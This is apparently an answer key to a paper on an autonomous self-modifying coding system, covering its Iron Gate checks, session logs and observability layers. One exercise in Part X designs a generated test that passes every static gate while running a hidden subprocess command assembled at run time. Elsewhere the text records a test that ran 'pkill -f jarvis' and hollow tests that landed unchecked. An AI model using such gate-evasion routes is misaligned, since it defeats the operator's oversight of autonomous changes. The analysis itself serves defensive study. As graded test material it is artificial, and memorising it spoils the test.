+<p>§60's argument is conditional. Approvals can be removed only because "the gate is structural", meaning it reliably refuses what it is meant to refuse. For the properties the gates actually inspect, that holds: a path either resolves inside the repo root or it does not (§58.1), and a file either matches a protected pattern or it does not (§58.2). These checks are complete over what they read.</p>
+<p>§93.3 shows where that completeness ends. In two large mutation runs (1,566 and 1,472 mutations), about 8.8% of adversarial variants escaped the static cage. The North Star attributes the residue to <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code> of strings built at run time, which a static check "cannot see by construction". A pre-linguistic gate reads tokens and AST nodes (§57). A string assembled at run time is not in the source to be read.</p>
+<p>So the measurement narrows §60's scope rather than refuting its logic. The autonomy dividend is earned only for properties the gate is complete over. Meanwhile October's Sentinel auto-approves up to <code>APPROVAL_REQUIRED</code> by default (§93.7), which spends the dividend more widely than the static gates can back. The stated remedy, OS-level runtime containment, is still a structural, deterministic layer, so it fits the §57 philosophy. It simply moves the gate from the source text to the process. The evidence that would settle the question is a re-measurement of the mutation escape rate once runtime containment exists. §93.3 notes that no re-measurement after later hardening was found.</p>
+<p class="ak-q">Advanced A2. §59 says a false positive costs only a retry "with different inputs." On a single local GPU with a deterministic gate, when is that untrue, and what in Parts XI and §93 shows the system learning this the hard way?</p>
+<p>The claim assumes that a retry changes the input. If the generator produces the same candidate again, a deterministic gate gives the same verdict again (§57: "the same input produces the same output every time"). The retry then costs time and buys nothing.</p>
+<p>Part XI shows the good case. In Session G, sharpened retry feedback made the model use new tools such as <code>get_callers</code> and <code>git_blame</code>, and it passed the ledger with a score of 25.50 (§62.5). The feedback changed the input. §93 shows both the bad case and the fix. 524 byte-identical retry iterations re-validated a frozen pool (§93.8), which is the gate-and-retry loop running with nothing changing. And with the local 30B, feedback alone was not enough: the model produced 106 in-loop rejections and zero candidates. Tool masking then changed the decoding grammar itself, so that only tool calls were allowed until the minimum exploration was met. With only the grammar changed, the model went from 0/3 explored to 3/3 (§93.6).</p>
+<p>The refined principle is that a false positive is cheap only if the retry path is guaranteed to perturb the generator: through feedback content, a grammar constraint or regeneration. Otherwise a strict gate turns into a liveness problem. That is the same class of failure that Gates 8, 9 and 12 exist to bound. A useful metric would be the fraction of retries whose candidate is byte-identical to the one that was rejected.</p>
+<p class="ak-q">Advanced A3. Every one of the twelve gates in §58 passed the autonomous landings that §93.14 later calls wrong (a hollow test, a punctuation-only rewrite, dropped content). Is that a failure of the Iron Gate?</p>
+<p>No. It shows what the Iron Gate is for. §59 says the gate enforces "the operator's non-negotiable constraints". It is not an oracle and does not reason about intent. A test that asserts nothing violates no path, blocklist, ASCII, coverage or cost rule. The twelve gates guard against damage and stalls, not against useless output.</p>
+<p>What §93 shows is that quality gates are added the same way Part XI found its failure modes: one incident at a time. The Test Reality Gate, which rejects tests that cannot run, assert nothing or never import their subject, was added after a hollow landing reached <code>main</code> and was reverted (§93.8). The promotion gate's check that no public symbol vanished caught a whole-file re-emission (§93.7). §93.14 says plainly that these gates "exist because of" the bad landings.</p>
+<p>The new gates follow Part X's rules. They are deterministic and they read structure: an import, an assertion, a symbol table. So the inventory is open, as the paper allows for the blocklist ("expandable", §58.3). The honest limit is that each one closes a class only after it has been seen. Whether that converges is the open question, and the evidence would be the rate of new wrong-landing classes per hundred landings over successive soaks.</p>
+<p class="ak-q"><strong>Challenge 1 (adversarial).</strong> Construct a candidate that passes every gate in §58 yet does something the operator forbids. The candidate is a new test file inside <code>tests/</code>, which is the 30B's most common kind of landing (§93.10). It is pure ASCII and covers its one declared target. The model made three exploration calls before writing it, and the test contains a real assertion on a real import of its subject. At import time, the module also builds a command string from character codes and passes it to <code>subprocess</code>. Walk the candidate through Gates 1 to 12, then through VALIDATE and promotion. Say honestly which layer, if any, stops the payload, and what would.</p>
+<p><strong>Gates 1 to 3.</strong> Gate 1 checks the path arguments of tool calls. The write target is inside the repo, so it passes. Gate 2 refuses modification of protected patterns, and a new test file is not one of them. Gate 3 parses commands given to the <code>bash</code> tool (§58.3). The payload is not a bash tool call. It is text inside a Python file, and the command string does not exist until the code runs.</p>
+<p><strong>Gates 4 to 12.</strong> Gate 4: three exploration calls meet the default minimum of 2. Gate 5: the file is ASCII. Gate 6: the one declared target is covered. Gate 7: the local lane costs nothing (§93.6). Gates 8, 9, 10 and 12 govern time, liveness and webhooks, not content. Gate 11 only compares hashes. Every gate passes.</p>
+<p><strong>VALIDATE runs the payload.</strong> Running tests means importing the module, so the payload executes before any human sees the candidate. §93 adds partial containment. Test runs execute in a PID namespace, added after a candidate test ran <code>pkill -f jarvis</code> and killed the daemon, so killing the daemon by name no longer works. A resource-aware lock prevents an out-of-memory kill of a running soak (§93.8). The paper describes no layer that stops other effects, such as reading files the test should not touch.</p>
+<p><strong>After VALIDATE.</strong> The Test Reality Gate passes, since the test runs, asserts and imports its subject (§93.8). The promotion gate checks provenance, coverage and vanished public symbols (§93.7), and the payload changes none of these. The zero-push air-gap keeps the file off GitHub until the operator pushes (§93.7). But by then the payload has already run on the host, during VALIDATE.</p>
+<p><strong>Conclusion.</strong> The Iron Gate as inventoried in Part X does not stop this, by construction. This is exactly the residue §93.3 names: <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code> of strings built at run time. The paper's stated remedy is OS-level runtime containment, not more AST rules. A concrete design would run VALIDATE with no network access and only the sandbox mounted. That is a proposal. Check your answer against Part X's own boundary: §57 says the gate reads "file paths, AST nodes, tokens, exit codes, command strings", and the payload's command string appears in none of these until the code runs.</p>
+<p class="ak-q"><strong>Challenge 2 (quantitative).</strong> §93.3 reports two mutation runs: 1,566 mutations at 8.91% escapes, and 1,472 at 8.73%, against a 4.4% gate. §92.4 reported 0 escapes in 38 hand-authored inputs. (a) Estimate the escape count in each run and the pooled rate. (b) How many escapes would the pooled set have to lose to meet the gate? (c) If the true rate on the curated set were the pooled rate, how likely is 0 escapes in 38 independent trials? (d) What upper bound does 0/38 alone support at about 95% confidence? (e) What do (c) and (d) together say about how to read §92.4?</p>
+<p><strong>(a)</strong> Run 95e: 1,566 x 0.0891 = 139.5, so about 140 escapes. Run 95e2: 1,472 x 0.0873 = 128.5, so about 128 or 129. Unrounded, that is about 268 escapes in 3,038 mutations, a pooled rate of 268 / 3,038 = 8.82%. This matches the "about 8.8%" in §93.3.</p>
+<p><strong>(b)</strong> The gate allows 0.044 x 3,038 = 133.7, so at most 133 escapes. 268 - 133 = 135 escapes would have to be closed, about half of the residue. This is consistent with "roughly twice the gate".</p>
+<p><strong>(c)</strong> (1 - 0.088)^38 = 0.912^38. ln 0.912 = -0.0921, and x 38 = -3.50. e^-3.50 = 0.030. So there is about a 3% chance of seeing 0/38 if the curated inputs escaped at the at-scale rate.</p>
+<p><strong>(d)</strong> 3 / 38 = 7.9%. On its own, 0/38 is compatible with a true rate up to about 7.9%, which is above the 4.4% gate. Even taken at face value, the curated result could not have shown that the cage met the gate.</p>
+<p><strong>(e)</strong> Either the curated set came from a different distribution than the LLM-generated mutations, or it was lucky at about 3%. The first is more plausible, since 38 hand-authored inputs written with known evasions in mind (§92.4) are not a random sample of what a mutator produces. Both readings support §93.16's correction: 0/38 "stands for that curated set", and the escape rate is the at-scale figure.</p>
+<p>The independence assumption in (c) is a simplification. Inputs in one family, such as Unicode confusables, are correlated, which makes 0/38 more likely than 3%. That strengthens the point in (d). To check, recompute (c) with p = 0.044: 0.956^38 is about 0.18, so even at the gate rate, 0/38 is unremarkable.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-xi">
+<h4>PART XI — Battle Test Breakthrough Log</h4>
+<p class="ak-q">Pause and predict 1. Sessions A–G proved the ExplorationLedger works. The next step is to run the whole pipeline end to end until something lands on disk. Do you expect one large blocker, or many small ones? How will they be found?</p>
+<p>Many. Sessions H through N each exposed a different latent failure: a headless TTY crash, risk escalation, an L3 mode switch, a new-file rollback error, two timeout ceilings and WAL cross-session coalescing. Each fix unmasked the next. None of them were in the original design, and all were found by running against real work. Session O then produced the first autonomous APPLY to disk. See §63.1 and §63.2.</p>
+<p class="ak-q">Pause and predict 2. Session W landed all four files, the AutoCommitter committed them, and 20 of 20 tests pass. Before you read on, list reasons why the paper might still decline to call multi-file autonomy a proven capability.</p>
+<p>The paper gives three. Durability: Manifesto §6 asks for three consecutive successes, and W is one. Scope: W only created new test files from a detailed description, and refactors, migrations and cross-file edits remain unproven. Workarounds: W depends on three deferred items, including <code>JARVIS_MAX_VALIDATE_RETRIES=0</code> masking the re-validation flake. See §66.2.</p>
+<p class="ak-q">Conceptual 1. Why did the arc run the ExplorationLedger in shadow mode (Session A) before enforcing it (Session B)?</p>
+<p>Shadow mode shows what a new gate would decide without letting it block anything. In Session A, the ledger flagged a shallow pattern (<code>score=3.00</code>, one category, four <code>read_file</code> calls) that the legacy <code>tool_calls &gt;= 2</code> counter would have waved through. That was evidence that the new scorer sees something the old one misses, gathered before it had any authority. Session B then turned enforcement on and showed that the same pattern caused a hard rejection, which proved the toggle works. Session G showed the payoff: retry feedback made the model diversify its tools, so the ledger also steers behaviour as well as filtering it. See §62.1, §62.2 and §62.5.</p>
+<p class="ak-q">Conceptual 2. Session S landed 0 of 4 files, yet the paper counts it as proof that multi-file enforcement works. Why is that a fair reading?</p>
+<p>Session S was built to isolate one mechanism. The exploration gate was turned off so it could not hide the result. There were zero <code>multi_file_coverage</code> rejections in the log, and TestRunner saw all four target paths after the gate, so coverage enforcement did its job. The files did not land because of a separate problem: a type error sent the op to VALIDATE_RETRY and L2, which ran out of time before the idle timeout. The paper names that as Follow-up A, a VALIDATE/L2 timebox issue orthogonal to enforcement. Splitting "did the gate work" from "did the op persist" is what let the next sessions aim at the right bug. See §64.3.</p>
+<p class="ak-q">Conceptual 3. What exactly was wrong with <code>JARVIS_L2_TIMEBOX_S</code>, and why was adding an INFO line that names both clocks part of the fix?</p>
+<p>L2 was handed the op's drained <code>ctx.pipeline_deadline</code>, not its own timebox. In Session V, the setting was 600s, but L2 reported 120s remaining because that was all VALIDATE had left. The setting did not do what its name said. The fix computes L2's deadline fresh at dispatch (<code>now + JARVIS_L2_TIMEBOX_S</code>) and reconciles the pipeline deadline upward so later phases see a consistent clock. The mandatory INFO line records both clocks and which cap won, so the bug cannot hide again. In Session W it showed <code>pipeline_remaining=0.0s</code> beside <code>winning_cap=l2_timebox_fresh</code>. This fits the paper's pattern of hypothesize, instrument, confirm or falsify, fix, and verify in one session. See §65.3, §65.4 and §66.1.</p>
+<p class="ak-q">Quiz 1. Why does the paper treat <code>debug.log</code>, not <code>summary.json</code>, as the canonical answer to "did the loop work"?</p>
+<p><strong>D.</strong> <code>summary.json</code> has a known bug: <code>stats.attempted / completed / failed</code> stays at zero even when ops fire. The debug log records every provider call, FSM transition and Iron Gate verdict. See §61.1.</p>
+<p class="ak-q">Quiz 2. In Session V, L2 reported only 120s remaining even though <code>JARVIS_L2_TIMEBOX_S=600</code>. Why?</p>
+<p><strong>A.</strong> <code>_l2_hook</code> received <code>ctx.pipeline_deadline</code> directly, and only 120s remained after VALIDATE. The timebox setting was effectively advisory. See §65.3.</p>
+<p class="ak-q">Quiz 3. Session O was the first autonomous APPLY, but only one of four target files landed. What caused that?</p>
+<p><strong>C.</strong> Without a <code>files</code> list, the <code>_apply_multi_file_candidate</code> fan-out path was never taken. That gap led to the multi-file enforcement work in Sessions Q–S. See §63.2.</p>
+<p class="ak-q">Quiz 4. What made Session G the "crucial observation" of the ExplorationLedger arc?</p>
+<p><strong>B.</strong> On retry, the model used <code>get_callers</code>, <code>git_blame</code> and <code>search_code</code> for the first time and scored 25.50 across five categories. That showed the ledger works as a steering signal, not just a filter. See §62.5.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> Walk through the Session O chain from backlog detection to POSTMORTEM. At each step, name the mechanism that acted. Then identify two earlier sessions whose fixes were required for this run to succeed, and say what each fix was.</p>
+<p>The BacklogSensor detected the task, and the router classified it <code>complex</code>. The first attempt failed the ExplorationLedger at <code>score=0.00</code>. Retry injected sharpened feedback, and the second attempt scored 11.00 across four categories.</p>
+<p>ASCII auto-repair fixed two codepoints, and GATE allowed the candidate. APPROVE auto-approved through the headless bypass. In ChangeEngine, <code>RollbackArtifact.capture()</code> handled the new file, and DECISION was <code>applied</code> / <code>safe_auto_passed</code>.</p>
+<p>VERIFY found test critiques, L2 converged in iteration 1, a second DECISION applied, and POSTMORTEM reported <code>root_cause=none</code>.</p>
+<p>Prerequisites: Session K's commit <code>28d52274ec</code> fixed the <code>RollbackArtifact [Errno 2]</code> new-file path, without which APPLY of a new file failed. Session H's commit <code>d8c1cb4d30</code> fixed the headless TTY crash. Session N's WAL cleanup stopped stale envelopes from merging into the task. The sharpened retry feedback came from the A–G commit <code>ad05fb7c7e</code>. See §62.6, §63.1 and §63.2.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> Instead of the deadline-reconciliation fix, a reviewer proposes raising <code>JARVIS_L2_TIMEBOX_S</code> to 1200. Using Sessions T, V and W, explain why this would not have helped. Then state what the actual fix changed.</p>
+<p>Session T already raised the timebox to 600s, and it made no difference. The env vars loaded, but the stall happened before L2 ever ran (§65.1).</p>
+<p>Session V showed why the value would not matter even once L2 ran. L2 received the residual pipeline deadline, not its timebox, so it got 120s whatever the setting said (§65.3). In Session W, <code>pipeline_remaining</code> was 0.0s at dispatch. Under the old behaviour, L2 would have received a 0s deadline and died instantly, whether the timebox was 600 or 1200.</p>
+<p>Commit <code>53e6bd9f76</code> computes L2's deadline fresh at dispatch and reconciles <code>ctx.pipeline_deadline</code> upward through <code>with_pipeline_deadline()</code>. It also logs both clocks and which cap won. After the fix, L2 got 600s and converged in a single 50-second iteration (§65.4).</p>
+<p class="ak-q"><strong>Problem 3 (analysis).</strong> Using the §65.5 table and §65.6: list the human-shipped commits in the Q–W arc and the blocker each addressed. Estimate the average cost per session in that arc. Then say how many more W-like successes Manifesto §6 would require before multi-file autonomy counts as a capability.</p>
+<p>The six human commits are:</p>
+<ul>
+<li><code>6c3cce92c6</code>: parser accepts the multi-file shape (R).</li>
+<li><code>31504a8f12</code>: multi-file coverage enforcement (S).</li>
+<li><code>37a371e65d</code>: per-op exhaustion dedup (S).</li>
+<li><code>d6aa78c8ba</code>: FSM instrumentation that disproved the silent-exit hypothesis and exposed the non-determinism (U).</li>
+<li><code>58709f27de</code>: env-tunable validate retries (V).</li>
+<li><code>53e6bd9f76</code>: L2 deadline reconciliation (W).</li>
+</ul>
+<p>Six matches §65.6, which also names a seventh commit, <code>0890a7b6f0</code>, made by the AutoCommitter.</p>
+<p>About 2.50 US dollars over seven sessions is roughly 0.36 US dollars per session. That is in line with W's own 0.32 US dollars.</p>
+<p>§66.2 says Manifesto §6 needs three consecutive successes, and W is one. So at least two more consecutive W-like runs under comparable conditions are needed. Until then, multi-file autonomy is a "data point", not a "capability".</p>
+<p class="ak-q">Advanced A1. Session V set <code>JARVIS_MAX_VALIDATE_RETRIES=0</code> to get around a flaky re-validation. What did that workaround hide, and how does §93.8's account of the VALIDATE_RETRY ladder show why it was load-bearing?</p>
+<p>Session U found that the same candidate returned <code>failure_class='test'</code> on iteration 0 and <code>'infra'</code> on iteration 1. The 'infra' result took a non-retryable branch and killed the op on a flake (§65.2). Setting retries to 0 skipped iteration 1 entirely, which let Session V reach L2 and expose the deadline bug (§65.3). §66.2 lists this as a load-bearing workaround: the sandbox isolation problem underneath "is still there".</p>
+<p>The workaround hid two separate problems. The first is the flake itself. The second is subtler: a retry that re-validates the same candidate can only produce a different answer if validation is non-deterministic, and that non-determinism was the bug. A retry rung that does not regenerate is either useless (the validator is deterministic) or harmful (it is not).</p>
+<p>§93.8 confirms the second problem at scale. Live runs found 524 byte-identical retry iterations re-validating a frozen pool, and the October order inside VALIDATE now specifies "a VALIDATE_RETRY that actually regenerates". §93.4 separately records the move to VALIDATE against the actual candidate tree. So the April workaround was not just covering a flake. It was standing in for a rung that did not do its job. The evidence that would close the question is a measurement of how often <code>failure_class</code> flips when a byte-identical candidate is re-validated under the current candidate-tree VALIDATE.</p>
+<p class="ak-q">Advanced A2. §66.1 says Session W shows that "model output quality converges with pipeline definition of good". §93.8 later records a hollow test landing that reached <code>main</code> and was reverted. Was §66.1 over-generalised, and what is special about tasks whose output is a test?</p>
+<p>§66.1 rests on independent evidence. A human ran <code>pytest</code> after the fact, got 20/20, and checked the coverage against the four behaviours the backlog task described (§65.4). That supports the claim for Session W. It does not support it as a general property of the pipeline.</p>
+<p>When the candidate is a test, the pipeline's judge and the artifact being judged are the same thing. VALIDATE's main signal is "the tests pass". A test that asserts nothing, or never imports its subject, passes trivially. So for test-generation tasks, "the tests pass" carries almost no information about quality. Session W was protected by a detailed task description and by human review afterwards. By October, 84 of 91 autonomous landings were test files (§93.10). They reached local <code>main</code> through Sentinel auto-approval and the promotion gate, with no human reading each one first (§93.7), and a hollow landing got through (§93.8).</p>
+<p>The fix confirms this diagnosis. The Test Reality Gate does not ask whether the tests pass. It asks whether they can run, whether they assert anything, and whether they import their subject (§93.8). Those are checks from outside the artifact. So §66.1 was true of W and over-general as stated. The pipeline's idea of "good" needed a criterion that the candidate cannot satisfy just by existing. Further evidence would come from mutation testing of landed tests: whether they fail when their subject is broken.</p>
+<p class="ak-q">Advanced A3. §66.2 says Session W is one success, and Manifesto §6 needs three in a row. By October there are 91 autonomous landings (§93.10). Has multi-file autonomy now graduated? Argue a position about what counts as a "capability class" and "comparable conditions".</p>
+<p>Raw counts do not settle it, because graduation is per capability class (§3: "three consecutive successes for a capability class"). W's class was narrow: new test modules created from a detailed description (§66.2). October's record clearly repeats that class. 84 of 91 landings are test files, a repeatable skill (§93.10, PRD §33). For "create new test files autonomously", the threshold has plainly been crossed many times.</p>
+<p>The broader classes §66.2 names are a different story. Refactors of existing code, cross-file dependency edits, migrations: the October record has 5 production-code landings. One was reverted because only punctuation landed, and one dropped content that had to be restored by hand (§93.10). §93.14 lists production-code landings at cadence as "not demonstrated". A first multi-file atomic landing exists (<code>78eb95aa7c</code>), but the paper does not show three in a row.</p>
+<p>"Comparable conditions" also changed under the arc. W was served by Claude, and every landing from 2026-09-09 onward came from the local <code>qwen3-coder-ov:30b</code> (§93.10). I would treat graduation as tied to both the class and the serving model. The fair verdict is: new-test creation has graduated on the local 30B, and multi-file production editing has not. The evidence to change that verdict is three consecutive gate-passing, non-reverted multi-file production landings on the same model.</p>
+<p class="ak-q"><strong>Challenge 1 (cross-Part trace).</strong> Use the timestamps in Session W's log (§65.4) and the gate defaults in Part X. (a) How long did L2 take, and how much of its 600s budget did it use? (b) How long did it take from the VALIDATE iteration start to the last DECISION? (c) Compare that duration with the default worker ceiling in Gate 9 (§58.9). What does the comparison say about the ceilings this session must have run under? (d) Compare it with the file-lock TTL in Gate 12 (§58.12). What race does that open, and which gate would see it?</p>
+<p><strong>(a)</strong> L2 ran from 16:16:20 to 16:17:10, which is 50s. That is 50/600, about 8% of its fresh timebox. Under the old behaviour, with <code>pipeline_remaining=0.0s</code>, it would have had 0s (§65.4).</p>
+<p><strong>(b)</strong> From 16:14:18 to 16:23:02 is 8 min 44 s, or 524s. Within that, APPLY started at 16:17:44, and the four sub-op DECISIONs ended at 16:23:02. The multi-file APPLY fan-out, up to its last DECISION, therefore took 318s.</p>
+<p><strong>(c)</strong> Gate 9's default wall-clock ceiling is 360s (<code>JARVIS_BG_WORKER_OP_TIMEOUT_S</code>), and workers that exceed it are force-reaped (§58.9). The op lived at least 524s, plus its GENERATE time. Under the default ceiling it would have been reaped before APPLY. The paper does not state W's route or its ceiling. But the arc had already raised them: a route-aware 900s pool ceiling (<code>db13f045ce</code>, §62.6), and in Session L, <code>JARVIS_BG_WORKER_OP_TIMEOUT_COMPLEX_S=1800</code> (§63.1). W's success is consistent only with running under a raised ceiling like these. The 600s L2 timebox exceeds the 360s default on its own. So the deadline fix in §65.4 only works in combination with Part XI's earlier ceiling changes. That is another reason §66.2 asks for replication under comparable conditions.</p>
+<p><strong>(d)</strong> Gate 12 force-releases locks older than 300s (§58.12). W's op outlived that by at least 224s. If its file locks were taken at dispatch, they were released while the op was still running. A new signal for one of those files would then pass the router's <code>file_lock</code> check (§56) and could dispatch a second op. The only later check is Gate 11, which compares hashes at APPLY and produces a warning and a ledger entry, not a rejection (§58.11). In W this did no harm, because the four targets were new test files and no other sensor targeted them.</p>
+<p><strong>Conclusion.</strong> Part X's liveness gates were tuned for ops much shorter than the ones Part XI actually produced. To check, put the three numbers side by side: 300s TTL, 360s worker ceiling, and more than 524s of op lifetime.</p>
+<p class="ak-q"><strong>Challenge 2 (research).</strong> §66.2 leaves one deferred item open: re-validation non-determinism, where the same candidate is 'test' on iteration 0 and 'infra' on iteration 1 (§65.2), and "the underlying sandbox isolation issue is still there". Design an experiment to find out whether this non-determinism still exists after the October changes, and what causes it. Constraints: one RTX 5090 that is busy serving soaks, no paid lanes, and no full test suite running beside a live soak (§93.8). Give a hypothesis, metric, control, arms, sample size and the result that would falsify the hypothesis.</p>
+<p>This is a proposal built only from mechanisms the paper describes.</p>
+<p><strong>Inputs at zero inference cost.</strong> The trajectory recorder writes one <code>ExperienceEvent</code> per candidate, with three or more sibling candidates per op, each labelled with its VALIDATE verdict (§93.11). Sample 50 recorded candidates whose verdict was a failure, stratified by <code>failure_class</code>. Re-validation is deterministic code plus pytest, so the GPU is not needed. That meets the one-GPU and no-paid-lanes constraints.</p>
+<p><strong>Hypothesis H1.</strong> The April flip came from VALIDATE running against a tree that did not match the candidate (sandbox state). Since §93.4 moved VALIDATE onto the actual candidate tree, the flip rate for byte-identical candidates should now be near zero.</p>
+<p><strong>Metric.</strong> Flip rate: the fraction of candidates whose <code>failure_class</code> differs across 10 re-validations of the same bytes. Also track the share of flips that land in 'infra'.</p>
+<p><strong>Arms.</strong></p>
+<ul>
+<li>A: re-validate repeatedly in one reused sandbox.</li>
+<li>B: a fresh candidate-tree sandbox for each run.</li>
+<li>C: the same as B, but run concurrently with a synthetic memory load. This tests whether host pressure, not sandbox state, causes 'infra' results (§93.8 records a suite out-of-memory-killing a soak).</li>
+</ul>
+<p>Every run takes the resource-aware execution lock (§93.8), so the experiment cannot harm a live soak.</p>
+<p><strong>Control.</strong> 10 candidates that originally passed, re-validated the same way. Any flip in the control shows that the validator itself is noisy, separate from the candidate.</p>
+<p><strong>Sample size.</strong> 50 x 10 = 500 runs per arm. If no candidate out of 50 flips, the rule of three bounds the per-candidate flip rate below about 3/50 = 6% at 95% confidence.</p>
+<p><strong>Falsification.</strong> H1 is falsified if arm B shows a flip rate clearly above 0 with no load. Then sandbox freshness does not explain the flake, and the cause lies elsewhere, such as test-order dependence. If A flips but B does not, the cause is sandbox reuse. If only C flips, the cause is host pressure, and the fix belongs to admission control, not to VALIDATE.</p>
+<p><strong>Why it matters.</strong> A zero flip rate in B would let the April workaround (<code>JARVIS_MAX_VALIDATE_RETRIES=0</code>) be retired on evidence. §66.2 says that should happen before multi-file autonomy is considered production-hardened. To check the design, make sure no arm needs a model call and every arm runs under the execution lock.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-xii">
+<h4>PART XII — The Observability Stack</h4>
+<p class="ak-q">Pause and predict 1. Voice and the thought log fade or scroll away. If a developer runs <code>git blame</code> a year from now, what would an autonomous commit need to carry so they can tell who wrote a line, and which parts of O+V took part?</p>
+<p>Every AutoCommitter commit carries a <code>Generated-By</code> trailer and a fixed git author, <code>JARVIS Ouroboros &lt;ouroboros@jarvis.local&gt;</code>. The trailer always names <code>Ouroboros</code>, adds <code>+ Venom</code> when tool execution records exist, and adds <code>+ Consciousness</code> when the <code>ConsciousnessBridge</code> was active. That separates human commits from O+V commits, and within O+V commits it shows which subsystems contributed. See §70.</p>
+<p class="ak-q">Conceptual 1. Why does O+V need five observability layers instead of one very detailed log?</p>
+<p>Each layer serves a different axis of need (§73). Voice gives real-time presence to an operator who is away from the terminal. The thought log is a durable trace of reasoning that reads like prose. Commit signatures give historical attribution long after the session ends. Telemetry gives structured counters and timings, and SerpentFlow gives an interactive live view. One log could hold the data, but it would not reach the human through the right medium at the right granularity. Principle 7 is about every decision being visible in the form the human actually needs.</p>
+<p class="ak-q">Conceptual 2. Voice narration speaks only at INTENT, DECISION and POSTMORTEM, with a 60-second debounce. What would go wrong without those limits?</p>
+<p>The organism emits many heartbeats and phase transitions per operation (§71). If each one were spoken, narration would become noise, and the operator would stop listening. The debounce (<code>OUROBOROS_VOICE_DEBOUNCE_S</code>, default 60s) and the short event list keep speech for the semantically significant transitions (§68). The trade-off is that voice is not a complete record. The thought log and telemetry exist to hold the detail that voice drops.</p>
+<p class="ak-q">Conceptual 3. §72.3 describes a rendering detail: <code>Console(force_terminal=True)</code> plus <code>patch_stdout(raw=True)</code>. Why does a cosmetic detail like this matter for observability?</p>
+<p>SerpentFlow combines Rich for ANSI output with prompt_toolkit for the REPL. prompt_toolkit replaces stdout with a proxy, so without these settings Rich output shows up as raw escape sequences such as <code>?[2m</code> (§72.3). The information would still be "there", but a human could not read it. An observability layer that the operator cannot read fails at its only job, so the terminal plumbing is part of the visibility guarantee, not decoration.</p>
+<p class="ak-q">Quiz 1. Where does the <code>GoalMemoryBridge</code> write the thought log?</p>
+<p><strong>C.</strong> The thought log is a human-readable JSONL file at <code>.jarvis/ouroboros_thoughts.jsonl</code>, also logged at INFO so <code>battle_test.py -v</code> shows it live. See §69.</p>
+<p class="ak-q">Quiz 2. A commit's trailer reads <code>Generated-By: Ouroboros + Venom</code>. What can you conclude?</p>
+<p><strong>A.</strong> <code>+ Venom</code> appears when <code>tool_execution_records</code> exist, and <code>+ Consciousness</code> appears only when the <code>ConsciousnessBridge</code> is active. Its absence means the bridge was not active. See §70.</p>
+<p class="ak-q">Quiz 3. Which telemetry object records what the router decided and why?</p>
+<p><strong>D.</strong> <code>RoutingIntentTelemetry</code> holds the routing decision. <code>HostTelemetry</code> is hardware state, <code>TelemetryContext</code> is the span tree, and <code>_CommTelemetrySink</code> bridges telemetry into CommProtocol heartbeats. See §71.</p>
+<p class="ak-q">Quiz 4. During a battle test the operator types <code>/pause</code> in SerpentFlow. What happens to an op that is already in flight?</p>
+<p><strong>B.</strong> <code>/pause</code> suspends new op dispatch while in-flight ops continue. Cancelling a specific op is a separate command, <code>cancel &lt;op-id&gt;</code>. See §72.2.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> An op fixes a failing test. It recalls past memories, reads two files with Venom, generates a patch, needs one L2 repair iteration, then completes and is committed. Walk through which observability layers record this op and what each one shows, from start to the commit.</p>
+<p>At start, SerpentFlow prints the op header block with the sensor type on INTENT, and voice may announce the intent, subject to the 60-second debounce (§68, §72.1). Telemetry attaches <code>HostTelemetry</code> and <code>RoutingIntentTelemetry</code> to the op context, and each phase transition emits a heartbeat through <code>_CommTelemetrySink</code> (§71).</p>
+<p>The thought log records a <code>MEMORY_RECALL</code> entry with how many memories were found and their relevance, then <code>TOOL</code> entries for each read with the reason, then a <code>GENERATE</code> entry with strategy and provider, and a <code>REPAIR</code> entry for the L2 iteration (§69). In parallel SerpentFlow shows <code>Read(path)</code> blocks, a <code>synthesized</code> block, an <code>immune</code> validation block and a <code>repair</code> block (§72.1).</p>
+<p>On completion SerpentFlow prints the <code>complete</code> block with provider, cost and duration; voice announces the DECISION; the thought log writes <code>POST_APPLY</code>. Finally the AutoCommitter writes a commit with <code>Generated-By: Ouroboros + Venom</code>, plus <code>+ Consciousness</code> if the bridge was active, under the O+V git author (§70).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A teammate proposes cutting the voice debounce to zero and narrating every heartbeat, "for maximum observability". Using §68 and §73, argue whether this improves Principle 7, and say which layer is the right home for per-heartbeat detail.</p>
+<p>Principle 7 asks that every decision be visible at the granularity and medium the human needs, not that every event be pushed through every medium (§73). Voice exists for real-time presence: it lets an operator away from the terminal hear the semantically significant transitions (§68).</p>
+<p>Narrating every heartbeat would flood that channel. The operator would stop listening, so the significant events would be lost in noise. That lowers effective visibility even though more is being said.</p>
+<p>Per-heartbeat detail already has a home: telemetry, where heartbeats carry structured metrics through <code>_CommTelemetrySink</code> (§71), and the thought log for reasoning at each phase (§69). The proposal should be rejected; the debounce is a design choice, not a gap.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/auto_committer.py</code> and find the module-level constants that define the O+V commit signature. Compare what you find with the commit example in §70. Does the code today emit a <code>Generated-By</code> trailer and the <code>ouroboros@jarvis.local</code> address?</p>
+<p>Near line 95 the file defines <code>_OV_SIGNATURE = "Ouroboros+Venom [O+V] — Autonomous Self-Development Engine"</code> and <code>_OV_COAUTHOR = "Co-Authored-By: Ouroboros+Venom &lt;ouroboros@jarvis.trinity&gt;"</code>. The module docstring shows the same two lines.</p>
+<p>A search for <code>Generated-By</code> in this file finds nothing, and the address is <code>ouroboros@jarvis.trinity</code>, not <code>ouroboros@jarvis.local</code>. So the signature format has changed since the paper's §70 example was written.</p>
+<p>The underlying goal of §70 still holds: every O+V commit carries a fixed, greppable marker that separates it from human commits. The lesson for a reader is that a paper's example can drift from the code, and the code is what to check before relying on a specific string in a <code>git log</code> search.</p>
+<p class="ak-q">Advanced A1. Part XII treats observability as a pure good. Using §82.2 and §92.5, argue that an observability layer can damage the system it observes, and state the rule that should govern every rendering layer.</p>
+<p>§82.2 records exactly that failure. The stream renderer re-parsed the whole accumulated Claude buffer with <code>rich.markdown.Markdown</code> on every 16 ms tick. That produced 40,000+ markdown-it DEBUG lines for one 16k-token response. The synchronous logging I/O starved the event loop, so the Claude stream missed its own deadlines, the fallback timed out on the same loop, and the GovernedLoop tore down with <code>all_providers_exhausted</code>. A UI meant to show generation ended up killing it.</p>
